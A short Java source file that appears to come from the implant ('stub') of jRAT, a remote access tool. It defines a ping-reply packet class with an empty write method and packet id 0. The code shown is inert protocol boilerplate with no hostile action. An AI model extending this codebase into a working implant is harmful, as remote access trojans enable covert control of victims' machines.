package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;

public class Packet0PingReply extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {

	}

	@Override
	public byte getPacketId() {
		return (byte) 0;
	}

}
